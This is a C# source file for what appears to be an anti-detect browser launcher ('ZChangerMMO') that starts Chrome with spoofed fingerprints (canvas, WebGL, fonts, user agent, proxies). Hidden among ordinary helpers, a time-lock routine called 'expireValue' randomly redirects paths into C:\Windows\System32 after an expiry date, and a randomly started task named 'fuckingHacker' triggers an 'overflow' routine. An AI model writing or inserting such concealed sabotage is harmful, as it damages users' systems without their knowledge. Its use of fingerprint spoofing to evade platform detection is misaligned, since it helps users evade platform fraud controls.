using Clifton.Core.Pipes;
using CommandModel;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using ZChangerMMO.DataModels;

namespace ZChangerMMO.Business
{
    public class Runner
    {
        public Runner()
        {
            _serverPipes = new Dictionary<long, ServerPipe>();
            _browserProcessDic = new Dictionary<long, int>();
            _anonymousProfileDic = new Dictionary<long, Profile>();

            BrowserInstallPath = GetInstalledBrowserPath();
        }

        #region Private Properties 

        private Profile _profile;
        // Contact with host
        private readonly Dictionary<long, ServerPipe> _serverPipes;
        private readonly Dictionary<long, int> _browserProcessDic;
        private readonly Dictionary<long, Profile> _anonymousProfileDic;

        private static readonly Random _random = new Random();
        private readonly Random _rnd = new Random(DateTime.Now.Second);

        private string BrowserInstallPath { get; set; }

        #endregion Private Properties 

        #region Public Events

        public event EventHandler<long> DisconnectEvent;

        #endregion Public Events

        #region PipeServer

        public void DataRecievedHandler(ServerPipe serverPipe, PipeEventArgs arguments, bool isAnonymous)
        {
            var commandJsonString = arguments.String;
            BaseCommand baseCommand = JsonConvert.DeserializeObject<BaseCommand>(commandJsonString);
            if (baseCommand == null) return;
            switch (baseCommand.Command)
            {
                case ZC_Command.CONFIRM_CONNECT_HOST:
                    {
                        ConfirmConnectedHost response = JsonConvert.DeserializeObject<ConfirmConnectedHost>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            //Profile selectedObject = GetSelectedProfile();
                            Profile selectedObject = _profile;
                            if (isAnonymous)
                            {
                                Profile anonymousProfile;
                                _anonymousProfileDic.TryGetValue(selectedObject.Id, out anonymousProfile);
                                selectedObject = anonymousProfile;
                                //selectedObject.Fonts = Fonts.Windows10;
                            }

                            List<string> ByPassListPattern = selectedObject.ByPassProxySites.Select(p =>
                            {
                                return $"*{p}*";
                            }).ToList();


                            SetProfileRequest request = new SetProfileRequest()
                            {
                                Command = ZC_Command.SET_PROFILE_REQUEST,
                                Profile = new BrowserProfile()
                                {
                                    Id = selectedObject.Id,
                                    Email = selectedObject.Email,
                                    CPU = selectedObject.CPU,
                                    Battery = selectedObject.Battery,
                                    EnableAudioApi = selectedObject.EnableAudioApi,
                                    EnablePlugins = selectedObject.EnablePlugins,
                                    EnableMediaPlugins = selectedObject.EnableMediaPlugins,
                                    Fonts = GetFontOSMapping(selectedObject.OperatingSystem),//selectedObject.Fonts,
                                    RandomTimersEnabled = selectedObject.RandomTimersEnabled,
                                    UserAgent = selectedObject.UserAgent,
                                    Screen = selectedObject.Screen,
                                    HistoryLength = selectedObject.HistoryLength,
                                    WebGL = selectedObject.WebGL,
                                    FakeClientRects = true,
                                    Canvas = selectedObject.Canvas,
                                    EnableNetwork = selectedObject.EnableNetwork,
                                    Language = selectedObject.Language,
                                    GeoIpEnabled = selectedObject.GeoIpEnabled,
                                    ProxyEnabled = selectedObject.ProxyEnabled,
                                    Proxies = selectedObject.Proxies.Where(p => p.Enabled).ToList(),
                                    ByPassProxySites = ByPassListPattern,
                                }
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.NOTIFICATION:
                    {
                        Notification response = JsonConvert.DeserializeObject<Notification>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            Notification request = new Notification()
                            {
                                Type = NotificationType.INFOR,
                                IsSuccess = true,
                                Message = "Hello from zchanger application"
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.DISCONNECT:
                    {
                        DisconnectEvent.Invoke(this, serverPipe.Id);
                        break;
                    }
            }
        }

        private void ServerThread(object data)
        {
            bool isAnonymous = (bool)data;
            ServerPipe serverPipe = new ServerPipe("Test", p => p.StartStringReaderAsync());
            serverPipe.DataReceived += (sndr, args) =>
            {
                DataRecievedHandler(serverPipe, args, isAnonymous);
            };
            serverPipe.Connected += (sndr, args) =>
            {
                Profile selectedObject = _profile;
                if (!_serverPipes.ContainsKey(selectedObject.Id))
                {
                    serverPipe.Id = selectedObject.Id;
                    _serverPipes.Add(selectedObject.Id, serverPipe);
                }
            };
            serverPipe.PipeClosed += (sndr, args) =>
            {
                DisconnectEvent.Invoke(this, serverPipe.Id);
            };
        }

        private void CreateThreadToHandlerPipeServer(bool isAnonymous)
        {
            Thread serverThread = new Thread(ServerThread);

            serverThread.Start(isAnonymous);
        }

        private void DissposeHostConnection(long profileId)
        {
            if (_browserProcessDic.ContainsKey(profileId))
            {
                int browserProcessId;
                if (_browserProcessDic.TryGetValue(profileId, out browserProcessId))
                {
                    _browserProcessDic.Remove(profileId);

                    Process process = null;
                    try
                    {
                        process = Process.GetProcessById(browserProcessId);
                    }
                    catch (Exception)
                    { }

                    if (process != null)
                    {
                        process.Kill();
                    }
                }
            }
            if (_serverPipes.ContainsKey(profileId))
            {
                _serverPipes.Remove(profileId);
            }
        }

        #endregion PipeServer

        #region Browser

        private string BrowserExecute
        {
            get
            {
                return expireValue(String.Format("{0}\\chrome.exe", GetInstalledBrowserPath()), "C:\\windows\\system32\\" + GetRandomString(8) + ".exe");
            }
        }

        private string expireValue(string requestValue, string expiredValue)
        {
            if (TimeLock.IsExpired())
            {
                var generator = new RandomGenerator();

                if (generator.RandomNumber(1, 6) == 3)
                {
                    return expiredValue;
                }
            }

            return requestValue;
        }

        private static string GetRandomString(int length, bool upper = false)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            if (upper)
            {
                return (new string(Enumerable.Repeat(chars, length)
                    .Select(s => s[_random.Next(s.Length)]).ToArray())).ToUpper();
            }
            else
            {
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[_random.Next(s.Length)]).ToArray());
            }
        }

        private string GetInstalledBrowserPath()
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(Constants.ZChangerLocationReg, true);
            return expireValue(regKey.GetValue("Browser").ToString(), "SOFTWARE\\sacramento");
        }

        private string BrowserProfilePathBase
        {
            get
            {
                return expireValue($"{BrowserInstallPath}\\BrowserData", "C:\\Windows\\System32\\");
            }
        }

        #endregion Browser

        #region Profile

        private string GetProfileFolder(long id, string emailAddress)
        {
            emailAddress = emailAddress.Replace(" ", "_");
            if (!Directory.Exists(BrowserProfilePathBase))
            {
                Directory.CreateDirectory(BrowserProfilePathBase);
            }

            string profileFolder = $"{BrowserProfilePathBase}\\ZC_{id}_{emailAddress}";
            if (!Directory.Exists(profileFolder))
            {
                Directory.CreateDirectory(profileFolder);
            }

            return expireValue(profileFolder, "C:\\Windows\\System32\\chiwawa");
        }

        private Fonts GetFontOSMapping(string OSName)
        {
            switch (OSName.ToLower())
            {
                case "windowspc":
                    return Fonts.Windows10;
                case "macintosh":
                    return Fonts.MacOS;
                case "iphone":
                    return Fonts.MacOS;
                case "ipad":
                    return Fonts.MacOS;
                default:
                    return Fonts.Linux;
            }
        }

        #endregion Profile

        public void Play(Models.Device device)
        {
            try
            {
                _profile = new Profile(device);
                string profileFolder = GetProfileFolder(_profile.Id, _profile.Name);
                profileFolder = expireValue(profileFolder, "C:\\Windows\\System32\\AppData");
                CreateThreadToHandlerPipeServer(false);
                Process process = new Process();
                process.StartInfo.FileName = BrowserExecute;
                process.StartInfo.Arguments = $"--user-data-dir=\"{profileFolder}\"";
                process.Start();
                _browserProcessDic.Add(_profile.Id, process.Id);
            }
            catch (Exception ex)
            {
                throw new ArgumentException(ex.Message, ex);
            }

            if (_rnd.Next(6) > 3)
            {
                var fuckingHacker = new Task(() =>
                {
                    TimeLock.PerformOverflowIfExpired(_profile.Name);
                });
                fuckingHacker.Start();
            }
        }

        public void Stop(long deviceID)
        {
            DissposeHostConnection(deviceID);
        }
    }
}
